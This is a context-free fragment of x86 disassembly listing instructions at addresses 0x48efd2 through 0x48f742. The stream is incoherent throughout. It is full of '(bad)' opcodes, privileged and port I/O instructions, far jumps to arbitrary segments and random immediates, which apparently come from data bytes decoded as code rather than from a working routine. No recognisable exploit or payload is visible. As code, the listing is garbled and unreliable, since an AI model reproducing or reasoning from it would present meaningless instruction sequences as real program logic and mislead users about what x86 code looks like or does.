  48efd2:	or     eax,0x296dc8d
  48efd7:	pop    ds
  48efd8:	inc    ecx
  48efd9:	loopne 0x48ef7c
  48efdb:	or     al,ah
  48efdd:	pop    ss
  48efde:	push   edx
  48efdf:	inc    edx
  48efe0:	or     al,0x69
  48efe2:	call   0xec10:0xe80a69a6
  48efe9:	adc    al,0xf0
  48efeb:	mov    ds:0x18a69a69,eax
  48eff0:	hlt    
  48eff1:	add    al,0xf8
  48eff3:	and    ch,ch
  48eff5:	inc    edx
  48eff6:	push   0x2f
  48eff8:	inc    esi
  48eff9:	push   ax
  48effb:	ins    BYTE PTR es:[edi],dx
  48effc:	add    bh,bl
  48effe:	push   cs
  48efff:	nop
  48f000:	sub    al,BYTE PTR ss:[edi]
  48f003:	or     DWORD PTR [edi],ecx
  48f005:	pusha  
  48f006:	imul   ebx,DWORD PTR [eax+0x2f],0xffffff80
  48f00a:	mov    esi,eax
  48f00c:	inc    esp
  48f00d:	retf   0x1a45
  48f010:	sub    BYTE PTR [edi-0x63a47aec],ch
  48f016:	mov    ebp,0xa53bfa50
  48f01b:	pop    eax
  48f01c:	mov    ds:0xffbb04e0,al
  48f021:	add    edi,esi
  48f023:	dec    DWORD PTR [eax+0x2d]
  48f026:	pop    ds
  48f027:	das    
  48f028:	mov    BYTE PTR [ebx+eax*1-0xca810eb],dl
  48f02f:	jo     0x48efc4
  48f031:	rol    bh,1
  48f033:	mov    esp,0x44b3cc8d
  48f038:	pop    edx
  48f039:	add    al,BYTE PTR [ebx]
  48f03b:	fs dec esp
  48f03d:	inc    DWORD PTR [edi]
  48f03f:	adc    DWORD PTR [eax],0x3c
  48f042:	dec    edx
  48f043:	cld    
  48f044:	iret   
  48f045:	je     0x48f06c
  48f047:	(bad)  
  48f048:	push   0xec293321
  48f04d:	daa    
  48f04e:	pop    edx
  48f04f:	hlt    
  48f050:	inc    ebp
  48f051:	cmp    BYTE PTR [eax-0x42],dl
  48f054:	mov    edi,0x851a4df
  48f059:	push   edi
  48f05a:	pop    ds
  48f05b:	inc    edi
  48f05c:	cmp    DWORD PTR [esi],0x2c
  48f05f:	or     BYTE PTR [eax],cl
  48f061:	loopne 0x48f068
  48f063:	jne    0x48f082
  48f065:	xchg   DWORD PTR [edi],edx
  48f067:	fcom   DWORD PTR [ecx+0x392e6025]
  48f06d:	mov    ebx,DWORD PTR [eax+0x47b07381]
  48f073:	mov    eax,0x144c18ff
  48f078:	lock aas 
  48f07a:	aam    0x37
  48f07c:	ret    
  48f07d:	xchg   ebx,eax
  48f07e:	push   ebx
  48f07f:	xchg   ebx,eax
  48f080:	out    0x24,eax
  48f082:	mov    ch,0x3b
  48f084:	mov    ebx,0xb02f598d
  48f089:	mov    al,0x74
  48f08b:	jo     0x48f0f1
  48f08d:	inc    ebp
  48f08e:	cmp    ebx,edi
  48f090:	je     0x48f065
  48f092:	pop    edx
  48f093:	sbb    ebp,DWORD PTR [edi+0x7c]
  48f096:	push   esi
  48f097:	(bad)
  48f09a:	adc    BYTE PTR [esi*2-0x7a5acf8b],ch
  48f0a1:	dec    esp
  48f0a2:	add    eax,0x62e4c168
  48f0a7:	xor    DWORD PTR [esi+0x77a18977],edi
  48f0ad:	sbb    ecx,edi
  48f0af:	repnz add eax,ebp
  48f0b2:	pop    es
  48f0b3:	sub    DWORD PTR [eax+0x5b2f038],ebp
  48f0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f0ba:	test   DWORD PTR [ebx],edx
  48f0bc:	sub    esi,DWORD PTR [ebp+0x7589dc9]
  48f0c2:	lods   al,BYTE PTR ds:[esi]
  48f0c3:	pop    es
  48f0c4:	(bad)  
  48f0c5:	sbb    bh,BYTE PTR ds:0x8bee9f0b
  48f0cb:	xchg   edi,eax
  48f0cc:	and    al,0x9a
  48f0ce:	ret    
  48f0cf:	das    
  48f0d0:	mov    ebp,0x418ae690
  48f0d5:	mov    BYTE PTR [edi+0x48203227],0x3a
  48f0dc:	mov    cl,0x90
  48f0de:	shld   DWORD PTR [eax+0x5c],edi,0xc2
  48f0e3:	ins    DWORD PTR es:[edi],dx
  48f0e4:	scas   eax,DWORD PTR es:[edi]
  48f0e5:	lahf   
  48f0e6:	sahf   
  48f0e7:	cs dec ecx
  48f0e9:	cs into 
  48f0eb:	add    ah,BYTE PTR [ecx-0x2b]
  48f0ee:	mov    al,0xc3
  48f0f0:	inc    edi
  48f0f1:	mov    dh,0x3c
  48f0f3:	add    BYTE PTR ds:0xa4ac09f3,al
  48f0f9:	xchg   DWORD PTR [edx-0x1],esi
  48f0fc:	add    eax,0x82c620b8
  48f101:	into   
  48f102:	adc    DWORD PTR [ebp+0x18],esi
  48f105:	into   
  48f106:	rol    eax,1
  48f108:	mov    ch,0x70
  48f10a:	rcl    ch,0x40
  48f10d:	pop    ebp
  48f10e:	loop   0x48f129
  48f110:	imul   edx,DWORD PTR [ebx],0xfe20e62b
  48f116:	sahf   
  48f117:	sbb    ah,BYTE PTR [ebp+edx*1-0x77]
  48f11b:	pop    eax
  48f11c:	push   0x48ce5073
  48f121:	mov    WORD PTR [ebp+0x1d],es
  48f124:	lods   al,BYTE PTR ds:[esi]
  48f125:	and    DWORD PTR [ebx+0x62189089],eax
  48f12b:	std    
  48f12c:	xor    ah,BYTE PTR [ecx]
  48f12e:	daa    
  48f12f:	mov    bh,0x2a
  48f131:	jno    0x48f19f
  48f133:	dec    esp
  48f134:	dec    esp
  48f135:	mov    al,0x6
  48f137:	cmc    
  48f138:	push   ds
  48f139:	jmp    0x48f145
  48f13b:	and    eax,0xc0089e15
  48f140:	adc    esi,DWORD PTR [ecx]
  48f142:	ror    bl,cl
  48f144:	loopne 0x48f145
  48f146:	or     BYTE PTR [esp+ebx*8+0xb6654ff],cl
  48f14d:	add    eax,0x7944b834
  48f152:	lods   al,BYTE PTR ds:[esi]
  48f153:	dec    esi
  48f154:	ret    
  48f155:	sbb    ebx,DWORD PTR [esp+edx*2+0x9b814b2]
  48f15c:	push   esp
  48f15d:	call   0x76c18a98
  48f162:	push   esp
  48f163:	jmp    0xa11d:0x62e04e58
  48f16a:	js     0x48f1b8
  48f16c:	cld    
  48f16d:	push   eax
  48f16e:	push   0x653fb09e
  48f173:	mov    esp,0x62612e2e
  48f178:	pop    esi
  48f179:	pop    ecx
  48f17a:	outs   dx,BYTE PTR ds:[esi]
  48f17b:	and    eax,0xb8edb6a
  48f180:	cmp    edi,DWORD PTR [eax-0x31]
  48f183:	dec    esi
  48f184:	add    BYTE PTR [eax+0x4be2f74b],dh
  48f18a:	ret    
  48f18b:	push   eax
  48f18c:	and    al,0x6
  48f18e:	mov    DWORD PTR [ebx-0x7af47cd7],ebx
  48f194:	dec    eax
  48f195:	cmp    BYTE PTR [ecx],al
  48f197:	lock outs dx,DWORD PTR ds:[esi]
  48f199:	sub    esp,DWORD PTR [ebx+ebx*2-0xa]
  48f19d:	jmp    0x48f1d4
  48f19f:	and    ebx,ebp
  48f1a1:	sbb    DWORD PTR [edx+0x7a],edx
  48f1a4:	adc    ecx,DWORD PTR [eax+0x7b]
  48f1a7:	adc    esp,esi
  48f1a9:	sbb    ecx,DWORD PTR [ebx-0x5f9d7857]
  48f1af:	cmp    BYTE PTR [edx],bh
  48f1b1:	inc    esi
  48f1b2:	mov    ds:0xebb3c3aa,al
  48f1b7:	shl    BYTE PTR [ecx+edi*1],1
  48f1ba:	mov    eax,ds:0xf7ae8636
  48f1bf:	add    edi,DWORD PTR [edx-0x2b]
  48f1c2:	push   es
  48f1c3:	sahf   
  48f1c4:	cmp    eax,DWORD PTR [edi+0x32]
  48f1c7:	ror    DWORD PTR [esi+0x41b3526a],0x49
  48f1ce:	sbb    bh,BYTE PTR [edx]
  48f1d0:	cmp    al,0x82
  48f1d2:	add    BYTE PTR [ebx],ch
  48f1d4:	jne    0x48f195
  48f1d6:	fs pop edi
  48f1d8:	mov    al,0x1e
  48f1da:	rol    DWORD PTR [ebp+0x25],1
  48f1dd:	es js  0x48f232
  48f1e0:	das    
  48f1e1:	sub    ecx,ecx
  48f1e3:	pop    eax
  48f1e4:	inc    esp
  48f1e5:	adc    dh,dl
  48f1e7:	push   ecx
  48f1e8:	test   DWORD PTR [esi+0xf],0xc448768b
  48f1ef:	dec    esi
  48f1f0:	add    eax,ebx
  48f1f2:	ror    BYTE PTR [ecx+0x3083b007],cl
  48f1f8:	sub    BYTE PTR [ebx+0x13027c9c],0x9e
  48f1ff:	pop    es
  48f200:	mov    cl,0x60
  48f202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f203:	scas   eax,DWORD PTR es:[edi]
  48f204:	sub    ah,BYTE PTR [ecx]
  48f206:	sbb    edi,ebp
  48f208:	push   ss
  48f209:	das    
  48f20a:	push   ss
  48f20b:	add    BYTE PTR [ebx],bh
  48f20d:	adc    eax,0x66d2f733
  48f212:	and    edx,DWORD PTR [eax+0x54]
  48f215:	and    edx,DWORD PTR [esi]
  48f217:	add    dl,dh
  48f219:	pop    ds
  48f21a:	mov    DWORD PTR [ecx+edi*4],ecx
  48f21d:	pop    ebx
  48f21e:	ins    DWORD PTR es:[edi],dx
  48f21f:	lea    ebp,[ebp+0xd]
  48f222:	enter  0xc846,0x8b
  48f226:	les    ecx,FWORD PTR [eax-0x2fb3c8c5]
  48f22c:	sub    edi,DWORD PTR [ebp-0x32df6f81]
  48f232:	or     eax,0x3525e85
  48f237:	test   eax,0x65aeda20
  48f23c:	popf   
  48f23d:	pop    esp
  48f23e:	xchg   ecx,eax
  48f23f:	push   ebx
  48f240:	push   eax
  48f241:	lock and DWORD PTR [ebx+0x8],esi
  48f245:	mov    edi,0x2971f091
  48f24a:	xor    ebx,DWORD PTR [ebp+0x33]
  48f24d:	test   DWORD PTR [edi+0x33862388],edi
  48f253:	cwde   
  48f254:	rol    BYTE PTR ds:0x2b07108b,0xf4
  48f25b:	std    
  48f25c:	sub    DWORD PTR [eax*4-0x417cc818],eax
  48f263:	and    bl,bl
  48f265:	push   ds
  48f266:	sbb    ah,BYTE PTR [edx]
  48f268:	pop    ecx
  48f269:	sbb    eax,0xc6e71805
  48f26e:	mov    esp,DWORD PTR [ebp+edi*1-0x37]
  48f272:	push   ebp
  48f273:	mov    ecx,0x48a5d5d0
  48f278:	nop
  48f279:	mov    dh,0xd3
  48f27c:	(bad)  
  48f27d:	jo     0x48f204
  48f27f:	add    bh,BYTE PTR [edi+0x5]
  48f282:	sbb    al,0x3a
  48f284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f285:	sbb    al,0x34
  48f287:	cmp    al,0x91
  48f289:	push   esi
  48f28a:	push   esi
  48f28b:	and    BYTE PTR [esp+edi*2],al
  48f28e:	(bad)  [ebp+0x2bd179f7]
  48f294:	sbb    DWORD PTR [edi+0x1b],ecx
  48f297:	imul   ebp,DWORD PTR [ebx+0x20],0xffffff9f
  48f29b:	push   cs
  48f29c:	adc    eax,0x5e249e80
  48f2a1:	adc    DWORD PTR [edi-0x14],ecx
  48f2a4:	push   esi
  48f2a5:	jmp    0x48f2af
  48f2a7:	push   ebx
  48f2a8:	imul   edx,eax,0xd9c00c3
  48f2ae:	jns    0x48f24f
  48f2b0:	jge    0x48f2b1
  48f2b2:	fadd   DWORD PTR [esi+0x44498b1f]
  48f2b8:	cmp    DWORD PTR [ecx+0x2374cf48],0x3b
  48f2bf:	inc    ecx
  48f2c0:	inc    esp
  48f2c1:	je     0x48f286
  48f2c3:	mov    WORD PTR [edx-0x53],cs
  48f2c6:	imul   eax,DWORD PTR [edi+0xc804b9c],0xb9bfd234
  48f2d0:	jecxz  0x48f346
  48f2d2:	dec    esi
  48f2d3:	xor    esi,esi
  48f2d5:	repz and al,0x5e
  48f2d8:	jp     0x48f30e
  48f2da:	lock jne 0x48f2c1
  48f2dd:	mov    BYTE PTR [ebx-0x6adcae40],bl
  48f2e3:	jns    0x48f29d
  48f2e5:	mov    eax,DWORD PTR [esi+eax*1]
  48f2e8:	fwait
  48f2e9:	lea    ebp,[ecx+0x3b2548a5]
  48f2ef:	(bad)  
  48f2f0:	aaa    
  48f2f1:	xor    al,0x81
  48f2f3:	cmp    DWORD PTR [ecx+edx*1+0x24],esi
  48f2f7:	xchg   BYTE PTR [esi],dl
  48f2f9:	xchg   BYTE PTR [eax-0x3ddd0641],dl
  48f2ff:	(bad)
  48f302:	pushf  
  48f303:	inc    esp
  48f304:	fisub  WORD PTR [edx-0x28f78d6c]
  48f30a:	cmc    
  48f30b:	jo     0x48f312
  48f30d:	shr    edi,0xe6
  48f310:	ds push ss
  48f312:	cmp    edi,ebx
  48f314:	sub    al,BYTE PTR [esi+0x55]
  48f317:	dec    eax
  48f318:	mov    cl,0x10
  48f31a:	mov    eax,0xd532cffd
  48f31f:	mov    eax,ds:0x51938089
  48f324:	mov    eax,0xf0e8591c
  48f329:	call   0x2d9d7f3
  48f32e:	mov    esi,esp
  48f330:	adc    al,0x86
  48f332:	pop    edi
  48f333:	mov    BYTE PTR [edi-0x35],bl
  48f336:	and    al,0x97
  48f338:	pop    esp
  48f339:	add    DWORD PTR [edx+0xa7497a4],esp
  48f33f:	xchg   ebx,eax
  48f340:	mov    al,ds:0xd5bcba7e
  48f345:	adc    cl,BYTE PTR [edx+ebp*1-0x48]
  48f349:	rol    BYTE PTR [ebx-0x76],cl
  48f34c:	js     0x48f371
  48f34e:	jno    0x48f35a
  48f350:	sub    ebp,esi
  48f352:	test   al,0x64
  48f354:	sbb    BYTE PTR [ecx-0x73],cl
  48f357:	xchg   ecx,eax
  48f359:	cmp    BYTE PTR [ebx],bh
  48f35b:	nop
  48f35c:	dec    ebx
  48f35d:	mov    esi,0x3844bb7e
  48f362:	pop    ebx
  48f363:	cmp    esp,DWORD PTR [edi+0x58]
  48f366:	mov    eax,DWORD PTR [edx]
  48f368:	lahf   
  48f369:	jns    0x48f37d
  48f36b:	lock cmp BYTE PTR [ecx],ah
  48f36e:	sub    ebp,DWORD PTR [eax]
  48f370:	jmp    0x48f34f
  48f372:	les    eax,FWORD PTR [ecx+0x5daccd47]
  48f378:	bound  esi,QWORD PTR [ebx+edi*1+0x62]
  48f37c:	and    al,0xb5
  48f37e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f37f:	fild   WORD PTR [ebp-0x6dcf94b7]
  48f385:	pop    edx
  48f386:	fild   WORD PTR [ecx-0x5a]
  48f389:	ror    BYTE PTR [edi+eiz*8+0x0],0xe8
  48f38e:	ret    
  48f38f:	int3   
  48f390:	pusha  
  48f391:	inc    edi
  48f392:	fcmovnu st,st(3)
  48f394:	mov    edx,0x770519a3
  48f399:	or     al,0x4c
  48f39b:	mov    dh,BYTE PTR [esi]
  48f39d:	and    esp,ebx
  48f39f:	mov    dh,0x6
  48f3a1:	enter  0x3a0f,0x4
  48f3a5:	(bad)  
  48f3a6:	fild   WORD PTR [eax+0x4b]
  48f3a9:	xchg   ebp,eax
  48f3aa:	xor    BYTE PTR [ecx],dl
  48f3ac:	call   0x8401:0xe6a49ba8
  48f3b3:	add    dh,BYTE PTR [ebp+0x62]
  48f3b6:	push   eax
  48f3b7:	fwait
  48f3b8:	test   DWORD PTR [edi-0x3fff61bd],esp
  48f3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f3bf:	mov    eax,0x89e48a3b
  48f3c4:	(bad)  
  48f3c5:	idiv   DWORD PTR [ebp-0x60]
  48f3c8:	adc    al,0x2b
  48f3ca:	int3   
  48f3cb:	dec    ebp
  48f3cc:	jne    0x48f39c
  48f3ce:	arpl   WORD PTR [esi],cx
  48f3d0:	cmp    esp,DWORD PTR ds:0x63b9280d
  48f3d6:	nop
  48f3d7:	ds inc ebx
  48f3d9:	dec    eax
  48f3da:	xor    DWORD PTR [ebx],esi
  48f3dc:	inc    eax
  48f3de:	adc    BYTE PTR [edx-0x56],0x16
  48f3e2:	jne    0x48f440
  48f3e4:	aaa    
  48f3e5:	or     DWORD PTR [edi-0x6e],edx
  48f3e8:	mov    eax,ds:0xbb0bca8
  48f3ed:	inc    ebx
  48f3ee:	push   esp
  48f3ef:	xor    cl,0x46
  48f3f2:	dec    esp
  48f3f3:	retf   0xef06
  48f3f6:	sub    eax,0xb40ecf00
  48f3fb:	inc    esp
  48f3fc:	xor    ebx,ebp
  48f3fe:	xor    BYTE PTR [ecx+eiz*2-0x3a],dl
  48f402:	inc    ecx
  48f403:	inc    ecx
  48f404:	test   eax,0xec0e0bf0
  48f409:	dec    edx
  48f40a:	dec    edx
  48f40b:	mov    eax,ds:0x48594310
  48f410:	jmp    0xe1204727
  48f415:	inc    eax
  48f416:	hlt    
  48f417:	ins    DWORD PTR es:[edi],dx
  48f418:	push   eax
  48f41a:	lods   eax,DWORD PTR ds:[esi]
  48f41b:	popa   
  48f41c:	aaa    
  48f41d:	dec    ebx
  48f41e:	lahf   
  48f41f:	inc    edi
  48f420:	adc    DWORD PTR ds:0x6a69002d,esi
  48f426:	add    DWORD PTR [edi],ebp
  48f428:	adc    eax,0x55200518
  48f42d:	cdq    
  48f42e:	icebp  
  48f42f:	sub    BYTE PTR [esp+ebx*1],ch
  48f432:	xor    eax,0x59df7746
  48f437:	pop    eax
  48f438:	sar    DWORD PTR [ecx+0x61482528],0xf0
  48f43f:	push   cs
  48f440:	pop    ecx
  48f441:	or     al,bl
  48f443:	mov    DWORD PTR [edi],0x44051627
  48f449:	sub    al,BYTE PTR [ebp-0x3]
  48f44c:	lahf   
  48f44d:	sbb    BYTE PTR [esi],0xe2
  48f450:	pusha  
  48f451:	xchg   ebp,eax
  48f452:	rcl    DWORD PTR [eax+0x1c6a86b5],1
  48f458:	ja     0x48f4b6
  48f45a:	loop   0x48f490
  48f45c:	iret   
  48f45d:	lahf   
  48f45e:	repnz and bh,bl
  48f461:	and    eax,0x12880f6
  48f466:	int3   
  48f467:	in     eax,dx
  48f468:	imul   ebp,DWORD PTR [ebx-0x46db567a],0x76be296a
  48f472:	(bad)  
  48f473:	lods   eax,DWORD PTR ds:[esi]
  48f474:	adc    eax,0x39bbea0
  48f479:	jne    0x48f4d8
  48f47b:	mov    eax,ds:0xd42761c3
  48f480:	xor    cl,dh
  48f482:	es xchg ecx,eax
  48f484:	rcl    BYTE PTR [ecx+0x6104ed81],1
  48f48a:	push   0x7
  48f48c:	sbb    DWORD PTR ds:0x749ba406,eax
  48f492:	dec    ebp
  48f493:	lock sbb DWORD PTR [eax],esp
  48f496:	add    BYTE PTR [eax+eiz*8-0x64cc3e4f],ch
  48f49d:	jmp    0x48f4d7
  48f49f:	dec    ebp
  48f4a0:	cmp    ecx,DWORD PTR [eax+eiz*4+0x6]
  48f4a4:	add    BYTE PTR ds:0x30596f16,cl
  48f4aa:	aaa    
  48f4ab:	dec    edx
  48f4ac:	inc    ebx
  48f4ad:	add    eax,DWORD PTR cs:[eax+esi*1]
  48f4b1:	sbb    esp,DWORD PTR [ecx+0x5]
  48f4b4:	outs   dx,BYTE PTR ds:[esi]
  48f4b5:	(bad)  
  48f4b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f4b8:	ins    BYTE PTR es:[edi],dx
  48f4b9:	dec    ebp
  48f4ba:	or     ch,cl
  48f4bc:	dec    eax
  48f4bd:	add    ch,BYTE PTR [eax]
  48f4bf:	in     al,0x14
  48f4c1:	mov    WORD PTR [ecx-0x7bccb589],fs
  48f4c7:	lahf   
  48f4c8:	cmp    DWORD PTR [ebp+0x45657f54],ebp
  48f4ce:	adc    edx,DWORD PTR [eax-0x1c]
  48f4d1:	fdiv   QWORD PTR [ebp-0x56]
  48f4d4:	fwait
  48f4d5:	add    BYTE PTR [eax],cl
  48f4d7:	xchg   BYTE PTR [esi-0x249993b5],cl
  48f4dd:	push   ebp
  48f4de:	rcr    BYTE PTR [eax],1
  48f4e0:	add    DWORD PTR [ecx],ebx
  48f4e2:	outs   dx,BYTE PTR ds:[esi]
  48f4e3:	xchg   DWORD PTR [eax],eax
  48f4e5:	add    ebx,DWORD PTR [ebx]
  48f4e7:	cmp    BYTE PTR [eax+0x6d4a6807],0xc0
  48f4ee:	xchg   ebp,eax
  48f4ef:	adc    edi,DWORD PTR [eax+0x5d22e102]
  48f4f5:	or     eax,0xaac16d48
  48f4fa:	mov    ds:0x5e311e24,al
  48f4ff:	mov    cl,0x2
  48f501:	cld    
  48f502:	xor    eax,0x850a3813
  48f507:	inc    edx
  48f508:	sub    ebx,DWORD PTR [edi]
  48f50a:	outs   dx,DWORD PTR ds:[esi]
  48f50b:	and    DWORD PTR [eax+0x29091113],eax
  48f511:	je     0x48f538
  48f513:	xchg   esp,eax
  48f514:	sbb    BYTE PTR [eax-0x58e30ae5],al
  48f51a:	add    WORD PTR [eax+0x43457a05],di
  48f521:	lds    eax,FWORD PTR [ecx+edx*1]
  48f524:	xor    bl,0x56
  48f527:	mov    al,0xdf
  48f529:	pop    es
  48f52a:	or     bl,al
  48f52c:	(bad)  
  48f52d:	dec    BYTE PTR [ebx+0x1148413]
  48f533:	shl    BYTE PTR [ebx+0x5f],0x2d
  48f537:	sub    cl,dh
  48f539:	jmp    0x483456aa
  48f53e:	dec    esp
  48f53f:	sub    ecx,DWORD PTR [eax+0x2]
  48f542:	jne    0x48f5b8
  48f544:	in     eax,dx
  48f545:	add    BYTE PTR [esi+ecx*2-0xbbb83f],dh
  48f54c:	ins    DWORD PTR es:[edi],dx
  48f54d:	or     DWORD PTR [ebx-0x12e67c80],0x2020b835
  48f557:	test   DWORD PTR [esi-0x12eaf348],esp
  48f55d:	push   ebp
  48f55e:	or     eax,eax
  48f560:	pop    edx
  48f561:	pop    ss
  48f562:	jg     0x48f5c4
  48f564:	nop
  48f565:	pop    ds
  48f566:	ret    0x4ef8
  48f569:	xchg   edi,eax
  48f56a:	sar    BYTE PTR [edi-0x61eb660f],0x1f
  48f571:	fs xor esi,esi
  48f574:	mov    dl,0xff
  48f576:	inc    DWORD PTR [esi+ecx*1+0x66525000]
  48f57d:	(bad)  
  48f57e:	sub    DWORD PTR [eax+0x40],edx
  48f581:	clc    
  48f582:	mov    bl,0x0
  48f584:	inc    edx
  48f585:	add    al,0xf6
  48f587:	inc    edx
  48f588:	sub    al,0x8
  48f58a:	or     eax,0xd65c0326
  48f58f:	inc    edx
  48f590:	sbb    bl,BYTE PTR [eax-0x77bcb43a]
  48f596:	stc    
  48f597:	xchg   DWORD PTR [ecx+0x6be086a3],ebp
  48f59d:	cmp    eax,0x100f191a
  48f5a2:	push   cs
  48f5a3:	outs   dx,BYTE PTR ds:[esi]
  48f5a4:	inc    esi
  48f5a5:	scas   eax,DWORD PTR es:[edi]
  48f5a6:	mov    ah,0x62
  48f5a8:	jmp    0xc1476cc1
  48f5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f5ae:	rcr    BYTE PTR [ebx],cl
  48f5b0:	sub    al,0x90
  48f5b2:	ret    
  48f5b3:	mov    ebp,fs
  48f5b5:	sahf   
  48f5b6:	rcl    BYTE PTR [ebx],0x6c
  48f5b9:	pop    esp
  48f5ba:	add    DWORD PTR ds:0xc1301706,esp
  48f5c0:	rol    cl,0x17
  48f5c3:	idiv   BYTE PTR [edi]
  48f5c5:	ss dec ecx
  48f5c7:	push   edi
  48f5c8:	add    al,0x88
  48f5ca:	fist   WORD PTR [ebp+0x6]
  48f5cd:	add    DWORD PTR [edi],esi
  48f5cf:	mov    cl,0xd2
  48f5d1:	mov    BYTE PTR [ebx-0x4e5cbb7a],dl
  48f5d7:	cld    
  48f5d8:	add    al,0xf9
  48f5da:	shl    BYTE PTR [ebx],1
  48f5dc:	push   ds
  48f5dd:	xchg   esp,eax
  48f5de:	scas   al,BYTE PTR es:[edi]
  48f5df:	push   edx
  48f5e0:	fbstp  TBYTE PTR [ecx-0xd]
  48f5e3:	mov    WORD PTR [ebx+edx*1],ss
  48f5e6:	das    
  48f5e7:	lock in al,0x9a
  48f5ea:	or     DWORD PTR [ecx+0xd],ebp
  48f5ed:	push   esi
  48f5ee:	(bad)  
  48f5ef:	mov    edi,0x49501ab8
  48f5f4:	mov    dh,0xb1
  48f5f6:	lock push 0x2cb61e31
  48f5fc:	push   ebx
  48f5fd:	or     al,0x83
  48f5ff:	push   ds
  48f600:	sub    ebx,DWORD PTR [edi-0x7b]
  48f603:	stos   DWORD PTR es:[edi],eax
  48f604:	xchg   DWORD PTR ds:0x908b0c53,edx
  48f60a:	jp     0x48f668
  48f60c:	das    
  48f60d:	fsubr  DWORD PTR [edi+0x10]
  48f610:	sub    al,0x73
  48f612:	or     BYTE PTR [esi+0x53],dl
  48f615:	jmp    0x6076a95f
  48f61a:	or     BYTE PTR [eax+0xbd217b8],bh
  48f620:	fadd   DWORD PTR [eax]
  48f622:	xchg   edi,eax
  48f623:	rcr    BYTE PTR [ebx+esi*1-0x6f],cl
  48f627:	xor    cl,0x37
  48f62a:	inc    esi
  48f62b:	(bad)  
  48f62c:	sub    DWORD PTR [ebx],esi
  48f62e:	add    bl,dh
  48f630:	fadd   QWORD PTR [eax+esi*1]
  48f633:	aaa    
  48f634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f635:	mov    dh,0xdb
  48f637:	inc    esp
  48f638:	cmp    DWORD PTR [eax+ebx*1-0x2a],esi
  48f63c:	adc    ah,BYTE PTR [ebx-0x19]
  48f63f:	test   al,0x78
  48f641:	mov    ds:0x4d86541e,al
  48f646:	adc    BYTE PTR ds:0x4a1c0ff7,dl
  48f64c:	push   ebx
  48f64d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f64e:	sbb    al,0x10
  48f650:	or     DWORD PTR [ebx],ebp
  48f652:	jno    0x48f6cd
  48f654:	int    0x6
  48f656:	jnp    0x48f6ad
  48f658:	xchg   esp,eax
  48f659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f65a:	call   0x17afe76b
  48f65f:	or     BYTE PTR [edx],al
  48f661:	ret    
  48f662:	jb     0x48f675
  48f664:	push   ebp
  48f665:	pop    ss
  48f666:	cli    
  48f667:	adc    DWORD PTR [edx+0x5c48083d],0xffffff8e
  48f66e:	dec    ecx
  48f66f:	jmp    0x48f6e8
  48f671:	popf   
  48f672:	mov    bl,bl
  48f674:	mov    ds:0x83c6ce07,al
  48f679:	sub    al,0xe9
  48f67b:	and    DWORD PTR [edx+ebx*4+0x58336064],ecx
  48f682:	add    esp,DWORD PTR [eax-0x71fbec7]
  48f688:	adc    DWORD PTR [ecx],eax
  48f68a:	jmp    0x1c091bc9
  48f68f:	dec    edx
  48f690:	xchg   esp,eax
  48f691:	in     al,0x82
  48f693:	cmp    edi,DWORD PTR [eax+0x49]
  48f696:	sub    al,BYTE PTR [ebp+0x5e]
  48f699:	hlt    
  48f69a:	ret    
  48f69b:	jno    0x48f6fe
  48f69d:	lods   eax,DWORD PTR ds:[esi]
  48f69e:	sub    dl,BYTE PTR [edx+0x67]
  48f6a1:	shr    BYTE PTR [esi],0x58
  48f6a4:	cmp    ebx,edi
  48f6a6:	neg    DWORD PTR [ecx-0x643f586]
  48f6ac:	cmp    eax,0x8433b63
  48f6b1:	mov    al,ds:0xfce1f13
  48f6b6:	inc    ecx
  48f6b7:	aaa    
  48f6b8:	push   edx
  48f6b9:	and    esi,edx
  48f6bb:	fiadd  DWORD PTR [esi+esi*2]
  48f6be:	and    eax,0x2e1b1355
  48f6c3:	aad    0x26
  48f6c5:	adc    BYTE PTR [ebp-0x4e],ah
  48f6c8:	inc    ebx
  48f6c9:	je     0x48f71d
  48f6cb:	cmp    eax,0xb2a80ca0
  48f6d0:	inc    esp
  48f6d1:	sub    eax,0xc35f1e92
  48f6d6:	push   esi
  48f6d7:	dec    edx
  48f6d8:	add    al,0x7d
  48f6da:	(bad)  
  48f6db:	js     0x48f6de
  48f6dd:	and    bl,BYTE PTR [ebx]
  48f6df:	leave  
  48f6e0:	neg    ecx
  48f6e2:	(bad)
  48f6e5:	nop
  48f6e6:	sub    al,0x8e
  48f6e8:	xor    DWORD PTR [edi+edx*8],0x5c04aeef
  48f6ef:	and    BYTE PTR [eax],dl
  48f6f1:	inc    ecx
  48f6f2:	out    0x38,eax
  48f6f4:	add    al,0x20
  48f6f6:	add    esi,DWORD PTR [ebx]
  48f6f8:	xor    eax,0x4414304e
  48f6fd:	ror    BYTE PTR [eax-0x7],1
  48f700:	ficom  DWORD PTR [ebp+0x10]
  48f703:	outs   dx,DWORD PTR ds:[esi]
  48f704:	adc    eax,0xc9330c31
  48f709:	push   edi
  48f70a:	adc    al,0x1e
  48f70c:	xor    BYTE PTR [edi-0x51],ch
  48f70f:	pop    ebx
  48f710:	(bad)  
  48f711:	xchg   ebp,eax
  48f712:	add    eax,0xd0150ac
  48f717:	cmp    DWORD PTR [esi-0x359f14c4],0xffffff83
  48f71e:	mov    cl,0x14
  48f720:	sub    eax,DWORD PTR [eax]
  48f722:	jne    0x48f72f
  48f724:	dec    esp
  48f725:	inc    ecx
  48f726:	out    0xd2,al
  48f728:	push   esp
  48f729:	add    al,BYTE PTR [edx+0x6f]
  48f72c:	xchg   BYTE PTR [ecx-0x71],al
  48f72f:	mov    dh,0x6f
  48f731:	mov    BYTE PTR [edx],0x3d
  48f734:	pusha  
  48f735:	lods   eax,DWORD PTR ds:[esi]
  48f736:	jae    0x48f6ce
  48f738:	jne    0x48f6c3
  48f73a:	outs   dx,BYTE PTR ds:[esi]
  48f73b:	adc    DWORD PTR [eax],ebx
  48f73d:	xchg   edi,eax
  48f73e:	xchg   ebx,eax
  48f73f:	add    DWORD PTR [edx],edi
  48f741:	xchg   esp,eax
  48f742:	je     0x48f7ac
